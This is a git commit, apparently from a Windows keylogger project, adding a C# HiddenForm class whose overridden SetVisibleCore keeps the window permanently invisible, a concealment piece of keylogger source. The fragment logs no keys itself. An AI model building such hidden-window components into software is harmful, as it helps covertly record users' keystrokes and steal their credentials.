9e120faee325084c09cbfd1761ccdc556e094d69
IgroVor <igrovator228@gmail.com>
2021-10-05 23:54:20 +0300

    Keylogger

---
+++ windows-key-logger-master/KeyLogger/Forms/HiddenForm.cs
@@ -0,0 +1,18 @@
+﻿using System.Windows.Forms;
+using KeyLogger.Enums;
+using static KeyLogger.WinApis.User32;
+
+namespace KeyLogger.Forms
+{
+	public class HiddenForm : Form
+	{
+		public int KeyId { get; set; }
+
+
+
+		protected override void SetVisibleCore(bool value)
+		{
+			base.SetVisibleCore(false);
+		}
+	}
+}
